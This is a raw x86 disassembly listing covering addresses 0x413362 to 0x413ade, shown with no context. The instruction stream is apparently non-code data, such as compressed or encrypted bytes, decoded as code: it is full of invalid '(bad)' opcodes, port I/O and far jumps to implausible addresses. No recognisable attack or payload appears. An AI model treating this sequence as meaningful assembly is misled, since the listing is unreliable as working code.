  413362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413363:	inc    edx
  413364:	and    BYTE PTR [eax],0xed
  413367:	sbb    BYTE PTR [eax],cl
  413369:	or     ebx,esi
  41336b:	(bad)  
  41336c:	fidiv  DWORD PTR [ebp+0x4f9be56c]
  413372:	inc    ebp
  413373:	sbb    eax,0x363d04f6
  413378:	jmp    0x4133ba
  41337a:	xchg   esp,eax
  41337b:	mov    gs,WORD PTR [ebp-0x59]
  41337e:	dec    esp
  41337f:	xchg   DWORD PTR [ecx],esi
  413381:	pusha  
  413382:	mov    ds:0xa9ef0a63,al
  413387:	dec    edi
  413388:	test   BYTE PTR [esi-0x5c22ea13],0x43
  41338f:	sbb    eax,0x2f0a4c1e
  413394:	and    eax,0xe2639361
  413399:	or     ah,BYTE PTR [eax-0x74]
  41339c:	ja     0x4133b3
  41339e:	lahf   
  41339f:	sbb    ch,dh
  4133a1:	outs   dx,BYTE PTR ds:[esi]
  4133a2:	pusha  
  4133a3:	and    eax,0xb0782daf
  4133a8:	stos   BYTE PTR es:[edi],al
  4133a9:	jns    0x41339b
  4133ab:	addr16 pop ebp
  4133ad:	bound  esi,QWORD PTR [edi-0x3910d424]
  4133b3:	call   0x2c85:0xca033e18
  4133ba:	scas   eax,DWORD PTR es:[edi]
  4133bb:	sbb    DWORD PTR [ebp+0x74d742f6],edi
  4133c1:	jge    0x41339b
  4133c3:	inc    eax
  4133c4:	jmp    0x2657f920
  4133c9:	xlat   BYTE PTR ds:[ebx]
  4133ca:	int3   
  4133cb:	lock push ds
  4133cd:	pop    edx
  4133ce:	xlat   BYTE PTR ds:[ebx]
  4133cf:	push   esp
  4133d0:	push   edx
  4133d1:	lods   eax,DWORD PTR ds:[esi]
  4133d2:	out    0xb5,al
  4133d4:	js     0x413421
  4133d6:	(bad)  
  4133d7:	fidivr WORD PTR [ecx+0x35101bd1]
  4133dd:	ja     0x41344f
  4133df:	xor    ecx,DWORD PTR ds:0x8ecef8ec
  4133e5:	popa   
  4133e6:	xor    BYTE PTR [ebx],ah
  4133e8:	std    
  4133e9:	push   cs
  4133ea:	xor    ah,al
  4133ec:	lds    edx,FWORD PTR [ebx]
  4133ee:	mov    ah,0x6c
  4133f0:	adc    DWORD PTR [ecx-0x67],esp
  4133f3:	loop   0x4133e6
  4133f5:	xchg   BYTE PTR [edx],cl
  4133f7:	icebp  
  4133f8:	mov    ah,BYTE PTR [ecx+0x3d]
  4133fb:	or     BYTE PTR [esi+0x54f28deb],bl
  413401:	jno    0x41341a
  413403:	push   ebp
  413404:	jmp    0x84b7ef6b
  413409:	sbb    eax,0x23d66590
  41340e:	scas   al,BYTE PTR es:[edi]
  41340f:	pop    ss
  413410:	jmp    0x4133bb
  413412:	pop    ecx
  413413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413414:	ds or  esp,edx
  413417:	mov    ah,0xc8
  413419:	stos   DWORD PTR es:[edi],eax
  41341a:	mov    edi,0x7f77dc0d
  41341f:	cwde   
  413420:	inc    edx
  413421:	stos   BYTE PTR es:[edi],al
  413422:	add    dl,al
  413424:	push   esp
  413425:	jbe    0x41349a
  413427:	cld    
  413428:	lods   eax,DWORD PTR ds:[esi]
  413429:	(bad)  
  41342a:	add    al,0xe4
  41342c:	add    al,0xd3
  41342e:	iret   
  41342f:	mov    ebp,0x2692b88e
  413434:	add    al,0x58
  413436:	xchg   edi,eax
  413437:	inc    eax
  413438:	loop   0x4133de
  41343a:	adc    al,0x4c
  41343c:	mov    ebp,0xabe4889b
  413441:	fbld   TBYTE PTR [esi+eax*4]
  413444:	inc    BYTE PTR [esi]
  413446:	jle    0x4133ef
  413448:	inc    edi
  413449:	sub    dl,BYTE PTR [esi+0x65]
  41344c:	rcr    DWORD PTR [esi+0x3c89b8db],0xea
  413453:	and    al,0x7f
  413455:	mov    ecx,0x7bdd10dd
  41345a:	test   al,0xdf
  41345c:	xlat   BYTE PTR ds:[ebx]
  41345d:	mov    eax,DWORD PTR [eax]
  41345f:	in     eax,dx
  413460:	nop
  413461:	xchg   ebx,eax
  413462:	cmc    
  413463:	in     al,0x34
  413465:	inc    ebx
  413466:	mov    BYTE PTR [ebx+eiz*2+0x3035bed5],ch
  41346d:	mov    bh,0x8a
  41346f:	popf   
  413470:	loop   0x41347e
  413472:	rcl    DWORD PTR [edx+0x1e],cl
  413475:	daa    
  413476:	cmp    bl,BYTE PTR [ecx]
  413478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413479:	ins    DWORD PTR es:[edi],dx
  41347a:	sti    
  41347b:	aaa    
  41347c:	or     BYTE PTR [eax-0x1ab2058a],ah
  413482:	mov    al,ds:0x5d71930
  413487:	mov    DWORD PTR [esp+ebx*1+0x32],edx
  41348b:	and    bl,bh
  41348d:	adc    ebp,edx
  41348f:	repnz in al,0xff
  413492:	jmp    0x4134e0
  413494:	rol    ebx,1
  413496:	stos   BYTE PTR es:[edi],al
  413497:	push   eax
  413498:	adc    al,0xcb
  41349a:	or     cl,BYTE PTR [esi]
  41349c:	pop    ss
  41349d:	int3   
  41349e:	mov    ds:0x264f4d3a,al
  4134a3:	mov    cl,0x47
  4134a5:	out    dx,eax
  4134a6:	jmp    0x86a21791
  4134ab:	stos   DWORD PTR es:[edi],eax
  4134ac:	xor    eax,DWORD PTR [ebx-0x80]
  4134af:	scas   al,BYTE PTR es:[edi]
  4134b0:	lods   al,BYTE PTR ds:[esi]
  4134b1:	loopne 0x4134f7
  4134b3:	inc    cx
  4134b5:	pop    esp
  4134b6:	xchg   DWORD PTR [edx],ebx
  4134b8:	sbb    DWORD PTR [esi+0x1432f04e],esi
  4134be:	in     eax,dx
  4134bf:	jp     0x4134f2
  4134c1:	sbb    DWORD PTR [edx+0x7b],esi
  4134c4:	retf   0x142f
  4134c7:	mov    ebx,ebx
  4134c9:	add    al,0xe7
  4134cb:	adc    edx,esi
  4134cd:	cli    
  4134ce:	(bad)  
  4134cf:	jp     0x413511
  4134d1:	leave  
  4134d2:	xor    al,BYTE PTR [ebx-0x17]
  4134d5:	and    BYTE PTR [esi-0x8],al
  4134d8:	cld    
  4134d9:	jmp    0x2885:0x6463c418
  4134e0:	scas   al,BYTE PTR es:[edi]
  4134e1:	gs xchg dl,al
  4134e4:	cmp    al,0x5e
  4134e6:	sbb    al,0xb
  4134e8:	and    BYTE PTR [edx-0x5beb2dc3],cl
  4134ee:	sbb    DWORD PTR [ebx+edx*2-0xb939a43],0xffffff91
  4134f6:	inc    esi
  4134f7:	or     edx,eax
  4134f9:	inc    ebp
  4134fa:	inc    BYTE PTR [ecx-0x27d19c4f]
  413500:	and    eax,0xb9d8301b
  413505:	jno    0x41353e
  413507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413508:	and    dh,al
  41350a:	mov    esi,ebx
  41350c:	dec    esp
  41350d:	cmp    eax,0xa64e60a7
  413512:	inc    esi
  413513:	lods   al,BYTE PTR ds:[esi]
  413514:	cs scas eax,DWORD PTR es:[edi]
  413516:	mov    WORD PTR [eax+0x58],cs
  413519:	daa    
  41351a:	dec    esi
  41351b:	jne    0x4134d3
  41351d:	lds    esi,FWORD PTR [bp-0xe]
  413521:	lods   al,BYTE PTR ds:[esi]
  413522:	push   es
  413523:	push   ebx
  413524:	test   BYTE PTR [ebp-0x2f],ch
  413527:	shr    BYTE PTR [edi+ebp*4-0x1a],0x4c
  41352c:	vunpckhps ymm6,ymm1,YMMWORD PTR [eax-0x6f]
  413531:	div    DWORD PTR [esp+eax*8-0x31]
  413535:	pushf  
  413536:	or     bh,ah
  413538:	les    ebx,FWORD PTR [edi-0x49]
  41353b:	out    dx,al
  41353c:	fstp   TBYTE PTR [ecx-0x63d20661]
  413542:	pop    ss
  413543:	jmp    0x4134d9
  413545:	mov    al,0x3
  413547:	dec    ebx
  413548:	je     0x4134db
  41354a:	cmp    BYTE PTR [ebx],0x49
  41354d:	fwait
  41354e:	rol    BYTE PTR [ebp-0x75463271],1
  413554:	push   ebp
  413555:	adc    BYTE PTR [ebp-0x6e],dl
  413558:	shrd   ecx,ecx,0x4f
  41355c:	stc    
  41355d:	xchg   ebx,eax
  41355e:	ret    0xad3c
  413561:	ins    BYTE PTR es:[edi],dx
  413562:	sub    esi,edi
  413564:	mov    BYTE PTR [eax],ah
  413566:	out    dx,al
  413567:	pop    edx
  413568:	popa   
  413569:	shr    DWORD PTR [eax],0xd6
  41356c:	sbb    BYTE PTR [edi+0xd873db0],bl
  413572:	shl    DWORD PTR [edx-0x7e],cl
  413575:	dec    ecx
  413576:	je     0x413555
  413578:	mov    ecx,0x85520a3b
  41357d:	neg    DWORD PTR [esi]
  41357f:	mov    al,ds:0xc57f6183
  413584:	out    dx,al
  413585:	adc    ebx,esp
  413587:	and    al,0x5d
  413589:	pop    ebp
  41358a:	push   ebx
  41358b:	(bad)  
  41358c:	push   cs
  41358d:	and    DWORD PTR [ecx+0x2ece39f7],eax
  413593:	mov    BYTE PTR [edx+ebx*1],dh
  413596:	add    DWORD PTR [ebx],edi
  413598:	stos   DWORD PTR es:[edi],eax
  413599:	lods   al,BYTE PTR ds:[esi]
  41359a:	fmul   DWORD PTR [eax]
  41359c:	maskmovq mm6,(bad)
  41359d:	div    DWORD PTR [edx]
  41359f:	pop    edx
  4135a0:	mov    cl,0x66
  4135a2:	adc    BYTE PTR [ebx-0x31],ch
  4135a5:	mov    edi,0xccaedafa
  4135aa:	cli    
  4135ab:	adc    eax,0x860a95e7
  4135b0:	daa    
  4135b1:	mov    ah,0x59
  4135b3:	nop
  4135b4:	xor    DWORD PTR [eax+edi*1-0x19e220bb],esi
  4135bb:	jbe    0x4135d1
  4135bd:	inc    ebp
  4135be:	mov    ebp,0xedf5642e
  4135c3:	(bad)  
  4135c4:	call   0x93942eb5
  4135c9:	jmp    0x1b9d58f1
  4135ce:	or     bh,bh
  4135d0:	jecxz  0x41363b
  4135d2:	clc    
  4135d3:	dec    edi
  4135d4:	jns    0x413655
  4135d6:	xchg   edi,eax
  4135d7:	movups XMMWORD PTR [ebx],xmm7
  4135da:	pop    edx
  4135db:	(bad)  
  4135dc:	in     al,dx
  4135dd:	cld    
  4135de:	js     0x413604
  4135e0:	jbe    0x4135fc
  4135e2:	clc    
  4135e3:	cmc    
  4135e4:	nop
  4135e5:	dec    ebx
  4135e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135e7:	mov    cl,0xa2
  4135e9:	out    dx,eax
  4135ea:	add    dl,BYTE PTR [edi-0x6cab9450]
  4135f0:	sub    BYTE PTR [eax+eax*8-0x2d],bh
  4135f4:	sti    
  4135f5:	cwde   
  4135f6:	xor    ebp,DWORD PTR [edi]
  4135f8:	xchg   BYTE PTR [eax-0x7d],cl
  4135fb:	(bad)  
  4135fc:	imul   eax,DWORD PTR [ebp-0x10913585],0xffffff88
  413603:	ins    DWORD PTR es:[edi],dx
  413604:	or     BYTE PTR [ebx+edx*2+0x6b4810ba],al
  41360b:	fistp  DWORD PTR [ecx]
  41360d:	mov    al,ds:0xb85c86a4
  413612:	dec    ebx
  413613:	mov    dl,0xa0
  413615:	lahf   
  413616:	je     0x4135b8
  413618:	mov    ecx,eax
  41361a:	jmp    0x4135df
  41361c:	inc    edi
  41361d:	add    BYTE PTR [edx],ch
  41361f:	or     eax,0x38b3524a
  413624:	aad    0xe9
  413626:	and    DWORD PTR [ebp-0x10],esp
  413629:	mov    ecx,0xc8aebd6c
  41362e:	scas   eax,DWORD PTR es:[edi]
  41362f:	mov    ebp,0x43af1777
  413634:	cli    
  413635:	stos   DWORD PTR es:[edi],eax
  413636:	shr    BYTE PTR [ecx+0x36e618df],1
  41363c:	push   ecx
  41363d:	sbb    al,0x9a
  41363f:	mov    DWORD PTR [ebx+0x41],edx
  413642:	mov    esp,0x4a155995
  413647:	cmp    eax,0x2cdfd07d
  41364d:	test   BYTE PTR [esi],bh
  41364f:	add    al,0x38
  413651:	and    BYTE PTR [ebx-0x7a],0x7b
  413655:	pop    ebx
  413656:	sahf   
  413657:	loopne 0x413607
  413659:	pop    ebx
  41365a:	es (bad) 
  41365c:	jg     0x413692
  41365e:	mov    bl,0xf5
  413660:	dec    ebx
  413661:	cmp    al,0xaa
  413663:	mov    ecx,0x60d9e245
  413668:	jp     0x4136d3
  41366a:	ss jno 0x4136ce
  41366d:	jl     0x41368c
  41366f:	and    BYTE PTR [eax],0x3f
  413672:	stos   DWORD PTR es:[edi],eax
  413673:	repnz fistp WORD PTR [eax]
  413676:	pop    edi
  413677:	out    0x10,al
  413679:	in     al,0x86
  41367b:	push   edx
  41367c:	inc    esi
  41367d:	mov    dh,0x86
  41367f:	xlat   BYTE PTR ds:[ebx]
  413680:	test   eax,0x4ca5cc0
  413685:	or     al,0x9d
  413687:	jne    0x413692
  413689:	cmp    eax,0xbdb2a90c
  41368e:	add    DWORD PTR [ebx],0x22
  413691:	dec    esp
  413692:	xchg   ebx,eax
  413693:	push   0xffffffc2
  413695:	out    0x5,al
  413697:	dec    ecx
  413698:	jmp    0x41364c
  41369a:	cmp    edx,DWORD PTR [edi+0x6e070084]
  4136a0:	pop    ebp
  4136a1:	out    dx,al
  4136a2:	push   eax
  4136a3:	in     eax,0x4e
  4136a5:	xchg   ebx,eax
  4136a6:	pop    esi
  4136a7:	sub    ebp,DWORD PTR [esi+ecx*2-0x27]
  4136ab:	push   0x97c78596
  4136b0:	js     0x413673
  4136b2:	jns    0x41371e
  4136b4:	sti    
  4136b5:	mov    al,0x60
  4136b8:	hlt    
  4136b9:	mov    ch,0x1b
  4136bb:	sar    ebp,cl
  4136bd:	add    ebp,DWORD PTR [esi+0x29]
  4136c0:	fwait
  4136c1:	out    dx,eax
  4136c2:	aaa    
  4136c3:	in     eax,dx
  4136c4:	push   ebx
  4136c5:	imul   edx,DWORD PTR [ecx],0x54950587
  4136cb:	int    0x9d
  4136cd:	dec    edi
  4136ce:	add    al,0x9a
  4136d0:	adc    BYTE PTR [esi-0x76],ch
  4136d3:	aas    
  4136d4:	ds xchg ecx,eax
  4136d6:	adc    eax,0x91cc5774
  4136db:	xor    al,0x56
  4136dd:	push   0xb63845d2
  4136e2:	and    edx,DWORD PTR [edx+esi*2]
  4136e5:	mov    edi,0x4031df51
  4136ea:	ins    BYTE PTR es:[edi],dx
  4136eb:	(bad)  
  4136ec:	pushf  
  4136ed:	mov    bl,0xa3
  4136ef:	push   edi
  4136f0:	jnp    0x41372b
  4136f2:	mov    esi,0xfe96f3b5
  4136f7:	cmc    
  4136f8:	sub    eax,0x99e01c59
  4136fd:	mov    esi,ecx
  4136ff:	outs   dx,BYTE PTR ds:[esi]
  413700:	in     eax,0x98
  413702:	cdq    
  413703:	sub    dl,BYTE PTR [edx]
  413705:	sbb    BYTE PTR [ebx-0x3c75f379],dl
  41370b:	stos   BYTE PTR es:[edi],al
  41370c:	sub    dh,bh
  41370e:	call   0x24b7:0x8990533
  413715:	fsubr  DWORD PTR [edx]
  413717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413718:	rol    BYTE PTR [esi],1
  41371a:	jmp    0x41373c
  41371c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41371d:	gs and al,0x60
  413720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413721:	fwait
  413722:	jle    0x413789
  413724:	stc    
  413725:	and    al,0x86
  413727:	bound  eax,QWORD PTR [edi+0x72b2b28f]
  41372d:	mov    BYTE PTR [esp+edx*2+0x4a],ah
  413731:	cwde   
  413732:	xor    eax,0x6bfd1493
  413737:	lds    ecx,FWORD PTR [edx]
  413739:	push   ebp
  41373a:	mov    bh,0xf3
  41373c:	ror    ecx,1
  41373e:	jmp    0xae5c5895
  413743:	js     0x4137bb
  413745:	bound  ebp,QWORD PTR ds:0xebdd2ffe
  41374b:	sub    DWORD PTR [ecx],ebp
  41374d:	(bad)  
  41374e:	mov    esp,0x31dc0fae
  413753:	stc    
  413754:	mov    BYTE PTR [ecx],bl
  413756:	daa    
  413757:	xor    ch,BYTE PTR [eax]
  413759:	xor    DWORD PTR [esi+0x43],esi
  41375c:	cdq    
  41375d:	push   ds
  41375e:	add    al,0x16
  413760:	adc    al,BYTE PTR [eax-0x8]
  413763:	mov    ebx,0x89c6852c
  413768:	aas    
  413769:	(bad)  
  41376a:	ret    0xe2e6
  41376d:	pop    edx
  41376e:	push   esi
  41376f:	mov    edx,0xa03df0d2
  413774:	mov    eax,ds:0x62fde486
  413779:	jnp    0x413728
  41377b:	jle    0x413705
  41377d:	xchg   ebx,eax
  41377e:	mov    ebx,esi
  413780:	not    DWORD PTR [ebp-0x66071b0a]
  413786:	xchg   BYTE PTR [edx-0x12],cl
  413789:	in     al,dx
  41378a:	outs   dx,DWORD PTR ds:[esi]
  41378b:	mov    ds:0x653b449e,eax
  413790:	sub    al,0x32
  413792:	out    0xf6,eax
  413794:	in     eax,dx
  413795:	loopne 0x4137a8
  413797:	into   
  413798:	aaa    
  413799:	cld    
  41379a:	call   0xf8649689
  41379f:	daa    
  4137a0:	mov    dh,BYTE PTR [eax+eax*2-0x4f95c7d]
  4137a7:	inc    eax
  4137a8:	and    edx,0x5f
  4137ab:	ror    BYTE PTR ds:0xca819545,0x2c
  4137b2:	retf   0x5a6c
  4137b5:	cmp    eax,0xf860fa75
  4137ba:	xchg   edi,eax
  4137bb:	std    
  4137bc:	rol    BYTE PTR [edx-0x76287c3b],cl
  4137c2:	sub    esp,DWORD PTR [esi+0x7f325cb1]
  4137c8:	lods   al,BYTE PTR ds:[esi]
  4137c9:	pop    ecx
  4137ca:	mov    ch,0x85
  4137cc:	ret    
  4137cd:	cli    
  4137ce:	mov    ebx,0x8f2e0772
  4137d3:	ja     0x413773
  4137d5:	in     eax,dx
  4137d6:	dec    edi
  4137d7:	push   eax
  4137d8:	scas   al,BYTE PTR es:[edi]
  4137d9:	(bad)  
  4137da:	jns    0x4137be
  4137dc:	icebp  
  4137dd:	ds out 0x98,eax
  4137e0:	dec    edi
  4137e1:	cmc    
  4137e2:	fdiv   st,st(6)
  4137e4:	cld    
  4137e5:	into   
  4137e6:	mov    dl,0xbe
  4137e8:	scas   al,BYTE PTR es:[edi]
  4137e9:	pop    ecx
  4137ea:	xchg   edx,eax
  4137eb:	loopne 0x41384c
  4137ed:	and    bh,0x26
  4137f0:	dec    edi
  4137f1:	or     edi,DWORD PTR [esi+0x41dd5929]
  4137f7:	fwait
  4137f8:	jmp    0xb83a:0x3e0dcc28
  4137ff:	cmp    DWORD PTR [esi-0x460dbd89],ebp
  413805:	pop    esi
  413806:	stos   BYTE PTR es:[edi],al
  413807:	fnstenv [ebx-0xb864765]
  41380d:	pop    ds
  41380e:	push   eax
  41380f:	cld    
  413810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413811:	lods   al,BYTE PTR ds:[esi]
  413812:	lock mov ebx,0x4a5ca365
  413818:	sbb    DWORD PTR [edi],edx
  41381a:	repnz sbb bh,bh
  41381d:	push   ss
  41381e:	or     dh,cl
  413820:	ret    0xfc09
  413823:	scas   al,BYTE PTR es:[edi]
  413824:	fsub   DWORD PTR [edx]
  413826:	inc    esi
  413827:	sahf   
  413828:	mov    BYTE PTR [ebx-0x541545a6],ah
  41382e:	je     0x413853
  413830:	gs jb  0x41382b
  413833:	cmp    DWORD PTR [ebx+0x72],edi
  413836:	fwait
  413837:	adc    BYTE PTR [ebp+0x4d823bbd],bh
  41383d:	push   0xffffffaf
  41383f:	cmp    ebp,ebp
  413841:	nop
  413842:	je     0x413861
  413844:	cmc    
  413845:	cmp    al,0xb6
  413847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413848:	(bad)  
  413849:	std    
  41384a:	out    0x41,al
  41384c:	test   DWORD PTR [esi],ecx
  41384e:	jne    0x4138b5
  413850:	hlt    
  413851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413852:	xor    esp,0xf9568c98
  413858:	pop    es
  413859:	push   ebp
  41385a:	push   eax
  41385b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41385c:	cmp    bh,BYTE PTR [ebx+0x6f]
  41385f:	cmp    BYTE PTR [edx],ch
  413861:	and    dl,BYTE PTR [ecx+0x5a]
  413864:	push   0xffffffc7
  413866:	(bad)  
  413867:	lahf   
  413868:	sbb    dl,ah
  41386a:	adc    al,0x56
  41386c:	inc    edi
  41386d:	push   edx
  41386e:	dec    ebp
  41386f:	arpl   WORD PTR [esi],bp
  413871:	(bad)  
  413872:	cmp    DWORD PTR [esi],edx
  413874:	mov    DWORD PTR [edx],esi
  413876:	data16 stc 
  413878:	mov    edi,0x37be3a37
  41387d:	mov    bh,0x5a
  41387f:	cmc    
  413880:	pop    ds
  413881:	inc    eax
  413882:	aaa    
  413883:	leave  
  413884:	sbb    dh,dl
  413886:	and    ah,BYTE PTR [edi]
  413888:	mov    ebx,cs
  41388a:	loop   0x4138f5
  41388c:	mov    esp,edx
  41388e:	fs jle 0xa8c4f483
  413895:	mov    edx,0xb8cb61e6
  41389a:	push   esi
  41389b:	outs   dx,DWORD PTR ds:[esi]
  41389c:	sahf   
  41389d:	jb     0x413909
  41389f:	dec    esp
  4138a0:	pushf  
  4138a1:	mov    ecx,DWORD PTR [edi]
  4138a3:	inc    ecx
  4138a4:	sbb    eax,0xa5e822db
  4138a9:	sbb    BYTE PTR [eax+eax*2+0x720e892],bh
  4138b0:	jno    0x413888
  4138b2:	ss loopne 0x413872
  4138b5:	fs test al,0x4e
  4138b8:	scas   eax,DWORD PTR es:[edi]
  4138b9:	lea    ebx,[ebp+0x22]
  4138bc:	inc    esi
  4138bd:	(bad)  
  4138bf:	les    edx,FWORD PTR [eax]
  4138c1:	ds mov esi,0x40480bcd
  4138c7:	repz das 
  4138c9:	or     edx,DWORD PTR [ebx-0x34699d67]
  4138cf:	in     eax,0x7
  4138d1:	cli    
  4138d2:	je     0x4138dc
  4138d4:	xchg   ebp,eax
  4138d5:	pop    eax
  4138d6:	push   edi
  4138d7:	jmp    0x90635aa2
  4138dc:	ror    DWORD PTR [ecx+edi*8+0x1f],0xfb
  4138e1:	xor    eax,0x524f44d4
  4138e6:	retf   
  4138e7:	out    0xd1,al
  4138e9:	rcl    BYTE PTR [edx+0x1a],1
  4138ec:	jnp    0x4138a3
  4138ee:	dec    edx
  4138ef:	adc    ecx,DWORD PTR [ebx-0x15b42542]
  4138f5:	adc    al,0x11
  4138f7:	or     BYTE PTR [ebp-0xfc30515],al
  4138fd:	push   0x51
  4138ff:	les    edx,FWORD PTR [edi]
  413901:	cmp    eax,0xc1a259e3
  413906:	mov    al,0x3a
  413908:	imul   eax,DWORD PTR [edi+0x6c],0x8c9a9cfa
  41390f:	mov    ch,dl
  413911:	xchg   ebp,eax
  413912:	push   cs
  413913:	popf   
  413914:	sub    eax,0x2b0e07e
  413919:	add    eax,0x279a6e5
  41391e:	push   ds
  41391f:	push   cs
  413920:	nop
  413921:	cdq    
  413922:	pushf  
  413923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413924:	inc    esi
  413925:	mov    edx,0xf0537a50
  41392a:	sbb    BYTE PTR [ecx+0x5e],al
  41392d:	data16 out 0x88,al
  413930:	or     DWORD PTR [esi+0x47bfec05],0xffffff8e
  413937:	sbb    ch,cl
  413939:	(bad)  
  41393a:	imul   edi,DWORD PTR [ebx],0x27
  41393d:	je     0x41395f
  41393f:	es mov dh,0x3c
  413942:	pop    es
  413943:	(bad)  
  413944:	retf   0xbd10
  413947:	or     DWORD PTR [esi+ebx*8-0x48],eax
  41394b:	stos   DWORD PTR es:[edi],eax
  41394c:	imul   ebx,ebp,0x48
  41394f:	call   0x7e10:0x1a6ead78
  413956:	repnz inc edx
  413958:	cmc    
  413959:	dec    edx
  41395a:	push   edx
  41395b:	xchg   edx,eax
  41395c:	ror    dh,cl
  41395e:	sub    DWORD PTR ds:0x908a80cf,ecx
  413964:	pop    ss
  413965:	mov    esp,DWORD PTR [ebp+0x18]
  413968:	jb     0x4138ef
  41396a:	ds cld 
  41396c:	jne    0x4139c3
  41396e:	xor    ebx,DWORD PTR [ebp+0x56]
  413971:	cli    
  413972:	retf   0x2ffb
  413975:	jl     0x4138f8
  413977:	repnz add BYTE PTR [ebx],ah
  41397a:	pushf  
  41397b:	lea    ebx,[ecx+0x3f]
  41397e:	jp     0x4139ae
  413980:	int3   
  413981:	das    
  413982:	add    BYTE PTR es:[eax],cl
  413985:	inc    eax
  413986:	sbb    esp,DWORD PTR [ebx]
  413988:	xchg   ecx,eax
  413989:	loope  0x413951
  41398b:	jbe    0x4139c3
  41398d:	dec    eax
  41398e:	push   edx
  41398f:	fmul   DWORD PTR [edx-0x66]
  413992:	sti    
  413993:	cld    
  413994:	int    0x8f
  413996:	push   ss
  413997:	and    dl,BYTE PTR [edx+0x30863bd8]
  41399d:	sbb    eax,DWORD PTR [eax]
  41399f:	jl     0x4139a0
  4139a1:	jecxz  0x4139e8
  4139a3:	jge    0x41399e
  4139a5:	add    esi,DWORD PTR [ecx]
  4139a7:	imul   esp,DWORD PTR [esi+0x114da8a9],0x865afc08
  4139b1:	in     eax,0x35
  4139b3:	adc    edx,ebx
  4139b5:	push   ebx
  4139b6:	sub    edx,0x2
  4139b9:	fsub   QWORD PTR es:[esp+ebp*4+0x1e]
  4139be:	in     eax,0x3e
  4139c0:	ja     0x4139fd
  4139c2:	pusha  
  4139c3:	push   cs
  4139c4:	jbe    0x4139d5
  4139c6:	in     al,dx
  4139c7:	push   edi
  4139c8:	lock out dx,eax
  4139ca:	(bad)  
  4139cb:	or     DWORD PTR [edx+0x49e2c048],edx
  4139d1:	sahf   
  4139d2:	xchg   edi,eax
  4139d3:	stos   BYTE PTR es:[edi],al
  4139d4:	retf   0x9734
  4139d7:	iret   
  4139d8:	fcom   DWORD PTR [edx-0x16]
  4139db:	call   0xaee8:0xa3e7d28f
  4139e2:	ret    
  4139e3:	jmp    0xff84:0xff3e4216
  4139ea:	and    BYTE PTR [ecx-0xa],0x84
  4139ee:	adc    ah,BYTE PTR [ecx-0x18408306]
  4139f4:	jp     0x4139bb
  4139f6:	sub    BYTE PTR ds:0xec137b49,0xe9
  4139fd:	pop    ecx
  4139fe:	icebp  
  4139ff:	frstor [ebx-0xa8d9621]
  413a05:	jg     0x413a15
  413a07:	clc    
  413a08:	ins    BYTE PTR es:[edi],dx
  413a09:	fisubr DWORD PTR [esi+0x5]
  413a0c:	xlat   BYTE PTR ds:[ebx]
  413a0d:	in     eax,0xbc
  413a0f:	jns    0x4139f6
  413a11:	push   0xffffffc2
  413a13:	xchg   BYTE PTR [ecx],dh
  413a15:	mov    bl,0xcc
  413a17:	mov    ds:0xf7b167c7,al
  413a1c:	sbb    ch,BYTE PTR [edx]
  413a1e:	cmc    
  413a1f:	pop    ds
  413a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a21:	jo     0x413a61
  413a23:	mov    esp,0xa068ec91
  413a28:	sbb    DWORD PTR [eax+0x6c745312],ebp
  413a2e:	ret    0x3bd2
  413a31:	xor    dh,BYTE PTR [ebp+edi*8+0x4459a1eb]
  413a38:	out    dx,eax
  413a39:	push   ss
  413a3a:	pusha  
  413a3b:	jecxz  0x4139f8
  413a3d:	lods   eax,DWORD PTR ds:[esi]
  413a3e:	add    bl,BYTE PTR ds:0x5be3c40b
  413a44:	dec    edx
  413a45:	mov    ebx,0x4bd877b
  413a4a:	dec    edi
  413a4b:	mov    cl,0xaa
  413a4d:	mov    ebx,0x4698d0f0
  413a52:	sbb    eax,0x3f7b8970
  413a57:	hlt    
  413a58:	xchg   ecx,eax
  413a59:	mov    esp,DWORD PTR [ecx+0x28]
  413a5c:	and    bh,BYTE PTR ds:0xac3488f4
  413a62:	push   esp
  413a63:	add    BYTE PTR [ebx+0x6c],ch
  413a66:	mov    al,gs:0xb6d1a83e
  413a6c:	std    
  413a6d:	push   0xffffffef
  413a6f:	inc    esp
  413a70:	push   esp
  413a71:	pop    esp
  413a72:	pusha  
  413a73:	div    BYTE PTR [ecx-0xd]
  413a76:	dec    ebp
  413a77:	js     0x413ab2
  413a79:	leave  
  413a7a:	stc    
  413a7b:	fiadd  WORD PTR ds:0x5e2ca473
  413a81:	push   ebx
  413a82:	inc    ebp
  413a83:	inc    esp
  413a84:	adc    al,0xaa
  413a86:	das    
  413a87:	test   DWORD PTR [eax],0x8433548c
  413a8d:	lock push ds
  413a8f:	inc    ebx
  413a90:	xchg   edi,eax
  413a91:	pop    esp
  413a92:	sbb    ebp,DWORD PTR [ecx+edi*1]
  413a95:	mov    ecx,0xe513bcd1
  413a9a:	cmp    BYTE PTR [ebx],dl
  413a9c:	add    al,0x9c
  413a9e:	push   0x2c77287a
  413aa3:	mov    bl,0xe0
  413aa5:	iret   
  413aa6:	imul   ebp,DWORD PTR [esi+0x63],0xffffff8c
  413aaa:	sub    DWORD PTR [eax-0x77d72aa1],eax
  413ab0:	add    edx,esi
  413ab2:	add    ch,BYTE PTR [ecx-0x33]
  413ab5:	pop    esp
  413ab6:	mov    ebp,0x2dd1fb6b
  413abc:	test   eax,0xb2524633
  413ac1:	fbld   TBYTE PTR [eax]
  413ac3:	cmc    
  413ac4:	or     al,0xe3
  413ac6:	inc    eax
  413ac7:	scas   eax,DWORD PTR es:[edi]
  413ac8:	imul   edx,DWORD PTR [eax-0x3a],0xac4efcdb
  413acf:	mov    edi,0x1d138bf7
  413ad4:	adc    BYTE PTR [ebx-0x10],cl
  413ad7:	shl    BYTE PTR [edi+0x35],0x20
  413adb:	popf   
  413adc:	pushf  
  413add:	lods   eax,DWORD PTR ds:[esi]
  413ade:	or     dh,BYTE PTR [edx]
